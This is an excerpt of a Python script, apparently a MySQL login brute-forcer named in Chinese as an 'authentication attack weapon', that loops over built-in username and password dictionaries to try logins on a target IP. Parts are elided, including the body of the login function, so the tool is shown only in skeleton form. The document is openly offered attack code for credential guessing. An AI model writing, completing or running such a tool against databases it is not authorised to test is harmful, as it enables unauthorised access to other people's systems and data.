...
# python MySQL身份认证攻击武器.py --target 10.0.4.143 --user ftp --pw guest
user_dict = ["root", "admin"]
password_dict = ["123456", "abcd1234", "QWER!@#$"]


def MySQLogin(target, username, password):
    try:
...
def main():
    ...
    parse.add_option("-u", '--user', type="string", dest="username",
                     help="login user name, e.g. root, guest ")
    parse.add_option("-p", '--pw', type="string", dest="password",
                     help="login password , e.g. abc123, toor")
    ...
    for user in users:
        for passwd in passwords:
            MySQLogin(options.target, user, passwd)
